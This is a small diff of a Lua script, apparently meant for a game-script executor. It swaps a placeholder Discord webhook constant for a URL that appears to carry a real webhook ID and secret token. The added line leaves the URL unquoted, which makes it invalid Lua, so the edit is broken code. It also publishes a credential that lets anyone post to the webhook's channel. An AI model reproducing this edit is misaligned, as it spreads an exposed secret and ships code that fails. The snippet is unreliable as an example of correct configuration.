@@ -656,7 +656,7 @@ local function safe_json(val)
 end
 
 -- 3. The Webhook Logic
-local WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE" -- <--- REPLACE THIS
+local WEBHOOK_URL = https://discord.com/api/webhooks/1481128380622704670/I14nsEuDtdJ2xBg8oqKyQi7y86Nbbkp_a3y-nO6yc0-0SQ9V5eaWhVozBEruS025Zv8A -- <--- REPLACE THIS
 
 if WEBHOOK_URL ~= "YOUR_DISCORD_WEBHOOK_URL_HERE" then
     -- Detect executor function
